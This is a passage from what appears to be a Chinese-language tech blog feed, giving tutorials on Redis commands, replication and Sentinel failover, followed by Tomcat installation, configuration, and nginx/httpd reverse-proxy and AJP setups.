100auto-aof-rewrite-min-size 64mbaof-load-truncated yes 登录，查询帮助，Redis3.2版本有个很好的显示帮助，Tab补全功能强大。 基本用法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859~]# redis-cli 127.0.0.1:6379&gt; AUTH ilinux #认证，和配置文件的requirepass相对应OK127.0.0.1:6379&gt; helpredis-cli 3.2.10To get help about Redis commands type: &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt; &quot;help &lt;command&gt;&quot; for help on &lt;command&gt; &quot;help &lt;tab&gt;&quot; to get a list of possible help topics &quot;quit&quot; to exit127.0.0.1:6379&gt; help @list 127.0.0.1:6379&gt; rpush weekdays Sunday127.0.0.1:6379&gt; LPUSH weekdays Sun Mon Tue Wed127.0.0.1:6379&gt; lindex weekdays 0&quot;Wed&quot;127.0.0.1:6379&gt; lindex weekdays 1&quot;Tue&quot;127.0.0.1:6379&gt; lindex weekdays 2&quot;Mon&quot;127.0.0.1:6379&gt; lindex weekdays 3&quot;Sun&quot;127.0.0.1:6379&gt; lindex weekdays 4&quot;Sunday&quot;127.0.0.1:6379&gt; llen weekdays(integer) 5127.0.0.1:6379&gt; lpop weekdays&quot;Wed&quot;127.0.0.1:6379&gt; lpop weekdays&quot;Tue&quot;127.0.0.1:6379&gt; lpop weekdays&quot;Mon&quot;127.0.0.1:6379&gt; lpop weekdays&quot;Sun&quot;127.0.0.1:6379&gt; llen weekdays(integer) 1127.0.0.1:6379&gt; lindex weekdays 0&quot;Sunday&quot;127.0.0.1:6379&gt; rpush weekdays Mon Tue Wed(integer) 4127.0.0.1:6379&gt; lrange weekdays 1 31) &quot;Mon&quot;2) &quot;Tue&quot;3) &quot;Wed&quot;127.0.0.1:6379&gt; llen weekdays(integer) 4127.0.0.1:6379&gt; lrange weekdays 1 101) &quot;Mon&quot;2) &quot;Tue&quot;3) &quot;Wed&quot;127.0.0.1:6379&gt; lrange weekdays 0 101) &quot;Sunday&quot;2) &quot;Mon&quot;3) &quot;Tue&quot;4) &quot;Wed&quot;127.0.0.1:6379&gt; ltrim weekdays 1 2OK127.0.0.1:6379&gt; lrange weekdays 0 101) &quot;Mon&quot;2) &quot;Tue&quot; @SET，无序集合，不会存在相同的集合元素，集合的交集、并集、差集运算。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394127.0.0.1:6379&gt; help @set SADD key member [member ...] summary: Add one or more members to a set since: 1.0.0 SCARD key summary: Get the number of members in a set since: 1.0.0 SDIFF key [key ...] summary: Subtract multiple sets since: 1.0.0 SDIFFSTORE destination key [key ...] summary: Subtract multiple sets and store the resulting set in a key since: 1.0.0 SINTER key [key ...] summary: Intersect multiple sets since: 1.0.0 SINTERSTORE destination key [key ...] summary: Intersect multiple sets and store the resulting set in a key since: 1.0.0 SISMEMBER key member summary: Determine if a given value is a member of a set since: 1.0.0 SMEMBERS key summary: Get all the members in a set since: 1.0.0 SMOVE source destination member summary: Move a member from one set to another since: 1.0.0 SPOP key [count] summary: Remove and return one or multiple random members from a set since: 1.0.0 SRANDMEMBER key [count] summary: Get one or multiple random members from a set since: 1.0.0 SREM key member [member ...] summary: Remove one or more members from a set since: 1.0.0 SSCAN key cursor [MATCH pattern] [COUNT count] summary: Incrementally iterate Set elements since: 2.8.0 SUNION key [key ...] summary: Add multiple sets since: 1.0.0 SUNIONSTORE destination key [key ...] summary: Add multiple sets and store the resulting set in a key since: 1.0.0127.0.0.1:6379&gt; SADD stus tom jerry lilei hanmeimei lucy lily(integer) 6127.0.0.1:6379&gt; SPOP stus 21) &quot;lily&quot;2) &quot;lilei&quot;127.0.0.1:6379&gt; SCARD stus(integer) 4127.0.0.1:6379&gt; smembers stus1) &quot;jerry&quot;2) &quot;hanmeimei&quot;3) &quot;tom&quot;4) &quot;lucy&quot;127.0.0.1:6379&gt; srem stus hanmeimei(integer) 1127.0.0.1:6379&gt; smembers stus1) &quot;jerry&quot;2) &quot;tom&quot;3) &quot;lucy&quot;127.0.0.1:6379&gt; SADD stus2 tom jeryy lucy lilei(integer) 4127.0.0.1:6379&gt; sinter stus stus21) &quot;tom&quot;2) &quot;lucy&quot;127.0.0.1:6379&gt; sunion stus stus21) &quot;jerry&quot;2) &quot;lilei&quot;3) &quot;jeryy&quot;4) &quot;tom&quot;5) &quot;lucy&quot;127.0.0.1:6379&gt; sdiff stus stus21) &quot;jerry&quot;127.0.0.1:6379&gt; sdiff stus2 stus1) &quot;lilei&quot;2) &quot;jeryy&quot; redis主从 Redis支持将数据同步到多台从库上，这种特性对提高读取性能非常有益。master可以有多个slave。除了多个slave连到相同的master外，slave也可以连接其它slave形成图状结构。主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理客户端发来的请求。相反slave在初次同步数据时则会阻塞不能处理客户端的请求。 主从复制可以用来提高系统的可伸缩性,我们可以用多个slave 专门用于客户端的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余。可以在 master 禁用数据持久化，只需要注释掉 master 配置文件中的所有 save 配置，然后只在 slave 上配置数据持久化。 redis cluster 12master 192.168.1.18slave 192.168.1.28 master相关配置 12345]# yum install -y redis]# grep &apos;^[^#]&apos; /etc/redis.confbind 0.0.0.0 #保证protected-mode不运行requirepass ilinux ]# systemctl start redis slave相关配置 12345678910111213]# yum install -y redis]# vim /etc/redis.conf #仅修改以下选项bind 0.0.0.0requirepass ilinuxslaveof 192.168.1.18 6379masterauth ilinux]# systemctl start redis]# redis-cli -a ilinux127.0.0.1:6379&gt; INFO replication# Replicationrole:masterconnected_slaves:1slave0:ip=192.168.1.28,port=6379,state=online,offset=77446,lag=1 Redis的主从配置相当简单，相对于mysql的冗杂。 Redis-HA的sentinel方案试验环境如下 12345678--------------------Arch : x86_64--------------------centos 7.5--------------------master 192.168.1.18node01 192.168.1.28node02 192.168.1.30 redis 的高可用方案基于自己的一套sentinel 集群来管理。 先配置主从,修改配置文件/etc/redis.conf 123456789101112131415161718192021222324252627282930master节点]# ]# vim /etc/redis.confbind 0.0.0.0requirepass ilinuxnode01节点]# vim /etc/redis.confbind 0.0.0.0requirepass ilinuxslaveof 192.168.1.18 6379masterauth ilinuxnode01节点]# vim /etc/redis.confbind 0.0.0.0requirepass ilinuxslaveof 192.168.1.18 6379masterauth ilinux]# systemctl start redis #三台主机全部启动redis服务。]# redis-cli -a ilinux127.0.0.1:6379&gt; INFO replication# Replicationrole:masterconnected_slaves:2slave0:ip=192.168.1.28,port=6379,state=online,offset=77446,lag=1slave1:ip=192.168.1.30,port=6379,state=online,offset=77446,lag=1master_repl_offset:77585repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:77584 再配置HA，/etc/redis-sentinel.conf配置文件 12345678]# vim /etc/redis-sentinel.conf #修改以下选项bind 0.0.0.0 #否则要进行认证，保证protected-mode不运行# sentinel myid 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 #要用到scp，保证myid不重复。sentinel monitor mymaster 192.168.1.18 6379 2sentinel auth-pass mymaster ilinux]# scp /etc/redis-sentinel.conf node01:/etc/]# scp /etc/redis-sentinel.conf node02:/etc/]# systemctl start redis-sentinel.service 高可用试验验证 1234567891011121314151617181920212223redis-cli -p 26379127.0.0.1:26379&gt; sentinel masters #查看master信息，127.0.0.1:26379&gt; sentinel slaves mymaster #mymaster 为集群名称]# systemctl stop redis #停止主节点的redis服务。]# redis-cli -p 26379 127.0.0.1:26379&gt; sentinel masters #隔一段时间，查看信息。10) &quot;master,disconnected&quot; #主节点失联10）&quot;s_down,master,disconnected #主观_down10) &quot;s_down,o_down,master,disconnected&quot; #客观_down10）&quot;master&quot; ##这里已经更换了主节点了。 #switch-master#这里可以看日志更为详细]# tail -f /var/log/redis/sentinel.log 2448:X 24 Jul 17:07:03.499 # +sdown master mymaster 192.168.1.18 63792448:X 24 Jul 17:07:03.540 # +new-epoch 32448:X 24 Jul 17:07:03.542 # +vote-for-leader 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 32448:X 24 Jul 17:07:03.562 # +odown master mymaster 192.168.1.18 6379 #quorum 3/22448:X 24 Jul 17:07:03.562 # Next failover delay: I will not start a failover before Tue Jul 24 17:13:04 20182448:X 24 Jul 17:07:04.427 # +config-update-from sentinel 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 192.168.1.18 26379 @ mymaster 192.168.1.18 63792448:X 24 Jul 17:07:04.427 # +switch-master mymaster 192.168.1.18 6379 192.168.1.30 63792448:X 24 Jul 17:07:04.427 * +slave slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 63792448:X 24 Jul 17:07:04.427 * +slave slave 192.168.1.28:6379 192.168.1.28 6379 @ mymaster 192.168.1.30 63792448:X 24 Jul 17:07:34.431 # +sdown slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 63792448:X 24 Jul 17:07:50.405 # -sdown slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379 当然，redis-HA方案有好几种，我们也可以用keepalived+VIP来实现，将master、backup、slave分离开来，master、backup自动VIP切换。]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat]]></title>
    <url>%2Ftomcat.html</url>
    <content type="text"><![CDATA[摘要： Tomcat相关的概念及安装 Tomcat的配置及解释 httpd/Nginx/Ajp下的tomcat集群实现 Mencached下的Tomcat会话存储 Tomcat相关概念Tomcat是由Apache软件基金会下属的Jakarta项目开发的一个Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。由于Tomcat本身也内含了一个HTTP服务器，它也可以被视作一个单独的Web服务器。但是，不能将Tomcat和Apache HTTP服务器混淆，Apache HTTP服务器是一个用C语言实现的HTTPWeb服务器；这两个HTTP web server不是捆绑在一起的。Apache Tomcat包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。Tomcat是Java 2 EE技术体系的不完整实现。 JDK：java工具箱 JRE：java运行时环境 JVM：C语言研发，java虚拟机 ajp：AJP13是定向包协议，httpd支持此协议，nginx不支持 jsp：java server page jasper：负责将.jsp 转换为 .java applet：Applet或Java小应用程序是一种在Web环境下，运行于客户端的Java程序组件 servlet：全称Java Servlet， 是用Java编写的服务器端程序，其主要功能在于交互式地浏览和修改数据，生成动态Web内容，将.java转换成字节码 安装Tomcatyum包安装12# yum install java-1.8.0-openjdk# yum install tomcat tomcat-webapps tomcat-admin-webapps tomcat-docs-webapp 12# java -version #查看java版本信息# tomcat version #查看tomcat版本信息 启动服务： 12345# systemctl start tomcat# ss -tnlLISTEN 0 1 ::ffff:127.0.0.1:8005 #管理端口，建议关闭LISTEN 0 100 :::8009 #AJP协议默认监听端口LISTEN 0 100 :::8080 #HTTP协议默认监听端口 tomcat的目录结构： 1234配置文件目录：/etc/tomcat/主配置文件：server.xmlwebapps存放位置：/var/lib/tomcat/webapps/环境配置文件：/etc/sysconfig/tomcat 官方发行版安装安装JDK： 下载地址：http://www.oracle.com/technetwork/java/javase/downloads/ 123456789# rpm -ivh jdk-8u25-linux-x64.rpm# ll /usr/java/ #默认安装路径lrwxrwxrwx 1 root root 16 Jul 17 19:46 default -&gt; /usr/java/latestdrwxr-xr-x 9 root root 268 Jul 17 19:46 jdk1.8.0_25lrwxrwxrwx 1 root root 21 Jul 17 19:46 latest -&gt; /usr/java/jdk1.8.0_25# vim /etc/profile.d/java.sh #将java环境变量加入系统环境变量export JAVA_HOME=/usr/java/latestexport PATH=$JAVA_HOME/bin:$PATH# . /etc/profile.d/java.sh 安装Tomcat： 下载地址：http://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.32/bin/apache-tomcat-8.5.32.tar.gz 1234567891011121314# useradd tomcat# tar xf apache-tomcat-8.5.32.tar.gz -C /usr/local/# cd /usr/local/local]# ln -sv apache-tomcat-8.5.32/ tomcatlocal]# cd tomcat/tomcat]# chgrp -R tomcat ./*tomcat]# chown -R tomcat logs/ temp/ work/tomcat]# chmod g+rx conf/tomcat]# chmod g+r conf/*# vim /etc/profile.d/tomcat.sh #配置环境变量export CATALINA_BASE=/usr/local/tomcatexport PATH=$CATALINA_BASE/bin:$PATH# . /etc/profile.d/tomcat.sh# su - tomcat -c &apos;catalina.sh start&apos; # ls -1 /usr/local/tomcat/bin：脚本及启动时用到的类conf：配置文件目录lib：库文件，Java类库，jarlogs：日志文件目录temp：临时文件目录webapps：webapp的默认目录work：工作目录 123456789101112# catalina.sh --helpcommands: debug #调试模式启动 jpda start #jpda的debug模式启动 run #前台启动 start #后台启动 stop #关闭 stop n #n秒后关闭 stop -force #强制关闭 stop n -force #n秒后强制关闭 configtest #测试配置文件语法 version #查看相关版本信息 1234567891011121314# catalina.sh versionUsing CATALINA_BASE: /usr/local/tomcatUsing CATALINA_HOME: /usr/local/tomcatUsing CATALINA_TMPDIR: /usr/local/tomcat/tempUsing JRE_HOME: /usr/java/latestUsing CLASSPATH: /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jarServer version: Apache Tomcat/8.5.32Server built: Jun 20 2018 19:50:35 UTCServer number: 8.5.32.0OS Name: LinuxOS Version: 3.10.0-862.el7.x86_64Architecture: amd64JVM Version: 1.8.0_25-b17JVM Vendor: Oracle Corporation manager、host-manager和docs依赖包： tomcat-webapps tomcat-admin-webapps tomcat-docs-webapp 配置：manager管理webapps应用程序1234# vim /etc/tomcat/tomcat-users.xml&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;user username=&quot;admin&quot; password=&quot;adminpass&quot; roles=&quot;manager-gui&quot;/&gt;# systemctl restart tomcat 访问：http://192.168.0.8:8080/manager/进入管理页面 配置：host-manager管理虚拟主机1234# vim /etc/tomcat/tomcat-users.xml&lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;# systemctl restart tomcat 访问：http://192.168.0.10:8080/host-manager/进入管理页面 docs获取离线文档 访问：http://192.168.0.10:8080/docs/ Tomcat的配置参数 server.xml：主配置文件 web.xml：每个webapp只有“部署”后才能被访问，它的部署方式通常由web.xml进行定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供默认部署相关的配置 context.xml：每个webapp都可以专用的配置文件，它通常由专用的配置文件context.xml来定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供默认配置 tomcat-users.xml：用户认证的账号和密码文件 catalina.policy：当使用-security选项启动tomcat时，用于为tomcat设置安全策略 catalina.properties：Java属性的定义文件，用于设定类加载器路径，以及一些与JVM调优相关参数 logging.properties：日志系统相关的配置 tomcat的核心组件：server.xml配置文件框架： 123456789101112&lt;Server&gt; &lt;Service&gt; &lt;connector/&gt; &lt;Engine&gt; &lt;Host&gt; &lt;Context&gt; &lt;Valve/&gt; &lt;/Context/&gt; &lt;/Host&gt; &lt;/Engine&gt; &lt;/Service&gt;&lt;/Server&gt; 每一个组件都由一个Java“类”实现，这些组件大体可分为以下几个类型： 顶级组件：Server 服务类组件：Service 连接器组件：http, https, ajp（apache jserv protocol） 容器类：Engine, Host, Context 被嵌套类：valve, logger, realm, loader, manager, … 集群类组件：listener, cluster, … Tomcat的常用组件配置： Server：代表tomcat instance，即表现出的一个java进程；监听在8005端口，只接收“SHUTDOWN”。各server监听的端口不能相同，因此，在同一物理主机启动多个实例时，需要修改其监听端口为不同的端口； Service：用于实现将一个或多个connector组件关联至一个engine组件； Connector组件：负责接收请求，常见的有三类http/https/ajp； 123456789port=&quot;8080&quot; 监听的端口protocol=&quot;HTTP/1.1&quot; 协议connectionTimeout=&quot;20000&quot; 连接超时时间，单位ms，2秒address：监听的IP地址；默认为本机所有可用地址；maxThreads：最大并发连接数，默认为200；enableLookups：是否启用DNS查询功能；acceptCount：等待队列的最大长度；secure：安全相关;sslProtocol：加密传输相关; Engine组件：Servlet实例，即servlet引擎，其内部可以一个或多个host组件来定义站点； 通常需要通过defaultHost属性来定义默认的虚拟主机； 123name=defaultHost=&quot;localhost&quot;jvmRoute= Host组件：位于engine内部用于接收请求并进行相应处理的主机或虚拟主机 12345&lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;&lt;/Host&gt;appBase：此Host的webapps的默认存放目录，指存放非归档的web应用程序的目录或归档的WAR文件目录路径；可以使用基于$CATALINA_BASE变量所定义的路径的相对路径；autoDeploy：在Tomcat处于运行状态时，将某webapp放置于appBase所定义的目录中时，是否自动将其部署至tomcat； Context组件：相当于nginx中的alias的功能 123&lt;Context path=&quot;/PATH&quot; docBase=&quot;/PATH/TO/SOMEDIR&quot; reloadable=&quot;&quot;/&gt;path:url路径docBase:网页文件目录路径 Valve组件： 1234定义访问日志：org.apache.catalina.valves.AccessLogValve&lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; 12定义访问控制：org.apache.catalina.valves.RemoteAddrValve&lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; deny=&quot;172\.16\.100\.67&quot;/&gt; 组件配置示例： 配置示例：Host组件 123456789101112131415161718192021222324252627[root@node1 ~]# vim /etc/tomcat/server.xml&lt;Engine&gt; ... &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/web/apps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;/&gt;&lt;/Engine&gt;[root@node1 ~]# mkdir -pv /web/apps/ROOT/[root@node1 ~]# vim /web/apps/ROOT/index.jsp&lt;%@ page language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt; &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;Session ID&lt;/td&gt; &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt; &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Created on&lt;/td&gt; &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt;[root@node1 ~]# systemctl restart tomcat测试访问：http://node1.fenghong.tech:8080/ 配置示例：Context组件 123456789101112[root@node1 ~]# vim /etc/tomcat/server.xml&lt;Engine&gt; ... &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/web/apps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Context path=&quot;/testapp&quot; docBase=&quot;/web/testapp&quot; reloadable=&quot;&quot;/&gt; &lt;/Host&gt;&lt;/Engine&gt;[root@node1 ~]# systemctl restart tomcat[root@node1 ~]# mkdir -pv /web/testapp/ROOT[root@node1 ~]# vim /web/testapp/index.jsp...测试访问：http://node1.fenghong.tech:8080/testapp/ 配置示例：Valve组件 1234567891011[root@node1 ~]# vim /etc/tomcat/server.xml&lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/web/apps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Context path=&quot;/testapp&quot; docBase=&quot;/web/testapp&quot; reloadable=&quot;&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node1_test_access_&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Context&gt;&lt;/Host&gt;[root@node1 ~]# systemctl restart tomcat[root@node1 ~]# tail /var/log/tomcat/node1_test_access_2018-07-17.log192.168.0.8 - - [17/Jul/2018:22:59:30 +0800] &quot;GET /testapp/ HTTP/1.1&quot; 200 334 JSP WebAPP的组织结构： index.jsp：主页； WEB-INF/：当前webapp的私有资源路径；通常用于存储当前webapp的web.xml和context.xml配置文件； META-INF/：类似于WEB-INF/； classes/：类文件，当前webapp所提供的类； lib/：类文件，当前webapp所提供的类，被打包为jar格式； webapp归档格式： .war：webapp .jar：EJB的类打包文件； .rar：资源适配器类打包文件； .ear：企业级webapp； 部署(deploy)webapp deploy：将webapp的源文件放置于目标目录(网页程序文件存放目录)，配置tomcat服务器能够基于web.xml和context.xml文件中定义的路径来访问此webapp；将其特有的类和依赖的类通过class loader装载至JVM； undeploy：反部署，停止webapp，并从tomcat实例上卸载webapp； start：启动处于停止状态的webapp； stop：停止webapp，不再向用户提供服务；其类依然在jvm上； redeploy：重新部署； 部署可分为自动部署和手动部署；手动部署又有冷部署和热部署： 冷部署：把webapp复制到指定的位置，而后才启动tomcat； 热部署：在不停止tomcat的前提下进行部署；部署工具有manager、ant脚本、tcd(tomcat client deployer)等； 示例：手动提供一测试类应用，并冷部署 1234567891011121314[root@node1 ~]# mkdir -pv /var/lib/tomcat/webapps/test/&#123;classes,lib,WEB-INF&#125;[root@node1 ~]# vim /var/lib/tomcat/webapps/test/index.jsp&lt;%@ page language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;java.util.*&quot; %&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Test Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;% out.println(&quot;hello world&quot;); %&gt; &lt;/body&gt;&lt;/html&gt;访问：http://192.168.0.10:8080/test/ NT：nginx | httpd + tomcat nginx和Tomcat通过http/https协议工作配置Tomcat： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263[root@tomcat ~]# mkdir -pv /data/webapp/ROOT/[root@tomcat ~]# vim /data/webapp/ROOT/index.jsp #提供jsp测试页&lt;%@ page language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt; &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;Session ID&lt;/td&gt; &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt; &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Created on&lt;/td&gt; &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt;[root@tomcat ~]# vim /data/webapp/ROOT/test.html #提供静态测试页static page[root@tomcat ~]# vim /etc/tomcat/server.xml #修改Tomcat配置，如下&lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos;?&gt;&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt; &lt;Listener className=&quot;org.apache.catalina.startup.VersionLoggerListener&quot; /&gt; &lt;Listener className=&quot;org.apache.catalina.core.AprLifecycleListener&quot; SSLEngine=&quot;on&quot; /&gt; &lt;Listener className=&quot;org.apache.catalina.core.JasperListener&quot; /&gt; &lt;Listener className=&quot;org.apache.catalina.core.JreMemoryLeakPreventionListener&quot; /&gt; &lt;Listener className=&quot;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener&quot; /&gt; &lt;Listener className=&quot;org.apache.catalina.core.ThreadLocalLeakPreventionListener&quot; /&gt; &lt;GlobalNamingResources&gt; &lt;Resource name=&quot;UserDatabase&quot; auth=&quot;Container&quot; type=&quot;org.apache.catalina.UserDatabase&quot; description=&quot;User database that can be updated and saved&quot; factory=&quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot; pathname=&quot;conf/tomcat-users.xml&quot; /&gt; &lt;/GlobalNamingResources&gt; &lt;Service name=&quot;Catalina&quot;&gt; &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; &lt;!-- &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; --&gt; &lt;Engine name=&quot;Catalina&quot; defaultHost=&quot;node1.fenghong.tech&quot;&gt; &lt;Realm className=&quot;org.apache.catalina.realm.LockOutRealm&quot;&gt; &lt;Realm className=&quot;org.apache.catalina.realm.UserDatabaseRealm&quot; resourceName=&quot;UserDatabase&quot;/&gt; &lt;/Realm&gt; &lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt; &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt; &lt;/Engine&gt; &lt;/Service&gt;&lt;/Server&gt;[root@tomcat ~]# systemctl start tomcat 配置nginx： 12345678910111213[root@tomcat ~]# vim /etc/nginx/conf.d/nginx_tomcat.confserver &#123; listen 80; server_name node1.fenghong.tech; index index.jsp index.html; location / &#123; root &quot;/data/webapp/ROOT/&quot;; &#125; location ~* \.(jsp|do)$ &#123; proxy_pass http://127.0.0.1:8080; &#125;&#125;[root@tomcat ~]# nginx 测试访问： http://node1.fenghong.tech/ http://node1.fenghong.tech/test.html httpd和Tomcat通过http/https协议工作123456789101112[root@tomcat ~]# httpd -M |grep proxy proxy_module (shared) #代理模块 proxy_ajp_module (shared) #适配ajp协议客户端 proxy_balancer_module (shared) proxy_connect_module (shared) proxy_express_module (shared) proxy_fcgi_module (shared) proxy_fdpass_module (shared) proxy_ftp_module (shared) proxy_http_module (shared) #适配http协议客户端 proxy_scgi_module (shared) proxy_wstunnel_module (shared) 配置Tomcat：如上 配置httpd： 123456789101112131415[root@tomcat ~]# vim /etc/httpd/conf.d/http_tomcat.conf&lt;VirtualHost *:80&gt; ServerName node1.fenghong.tech ProxyRequests Off #关闭正向代理 ProxyVia On ProxyPreserveHost On #将请求头HOST发送给后端主机 &lt;Proxy *&gt; Require all granted &lt;/Proxy&gt; ProxyPass / http://127.0.0.1:8080/ &lt;Location /&gt; Require all granted &lt;/Location&gt;&lt;/VirtualHost&gt;[root@tomcat ~]# systemctl start httpd http和Tomcat通过ajp协议工作配置Tomcat： 123[root@tomcat ~]# vim /etc/tomcat/server.xml&lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;[root@tomcat ~]# systemctl restart tomcat 配置httpd： 123456789101112131415[root@tomcat ~]# vim /etc/httpd/conf.d/http_tomcat.conf&lt;VirtualHost *:80&gt; ServerName node1.fenghong.tech ProxyRequests Off ProxyVia On ProxyPreserveHost On &lt;Proxy *&gt; Require all granted &lt;/Proxy&gt; ProxyPass / ajp://127.0.0.1:8009/ &lt;Location /&gt; Require all granted &lt;/Location&gt;&lt;/VirtualHost&gt;[root@tomcat ~]# systemctl restart httpd nntm的会话保持实现 session sticky：会话绑定 source_ip：基于源地址做会话绑定；nginx: ip_hash，haproxy: source，lvs: sh cookie：基于cookie做会话绑定；nginx：hash，haproxy: cookie httpd + nginx + tomcat cluster：基于cookie实现会话绑定前端httpd调度器： 12345678910111213141516171819202122232425[root@Director ~]# httpd -M |grep balancer proxy_balancer_module (shared)[root@Director ~]# vim /etc/httpd/conf.d/httpd-tomcat.confHeader add Set-Cookie &quot;ROUTEID=.%&#123;BALANCER_WORKER_ROUTE&#125;e; path=/&quot; env=BALANCER_ROUTE_CHANGED&lt;proxy balancer://tcsrvs&gt; BalancerMember http://192.168.0.10:80 route=TomcatA loadfactor=1 BalancerMember http://192.168.0.11:80 route=TomcatB loadfactor=2 ProxySet lbmethod=byrequests ProxySet stickysession=ROUTEID&lt;/Proxy&gt;&lt;VirtualHost *:80&gt; ServerName www.fenghong.tech ProxyVia On ProxyRequests Off ProxyPreserveHost On &lt;Proxy *&gt; Require all granted &lt;/Proxy&gt; ProxyPass / balancer://tcsrvs/ ProxyPassReverse / balancer://tcsrvs/ &lt;Location /&gt; Require all granted &lt;/Location&gt; &lt;/VirtualHost&gt;[root@Director ~]# systemctl start httpd tomcat-node-1： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@tomcat-node-1 ~]# vim /etc/nginx/conf.d/nginx_tomcat.conf server &#123; listen 80 default_server; server_name node1.fenghong.tech; index index.jsp index.html; location / &#123; root &quot;/data/webapp/ROOT/&quot;; &#125; location ~* \.(jsp|do)$ &#123; proxy_pass 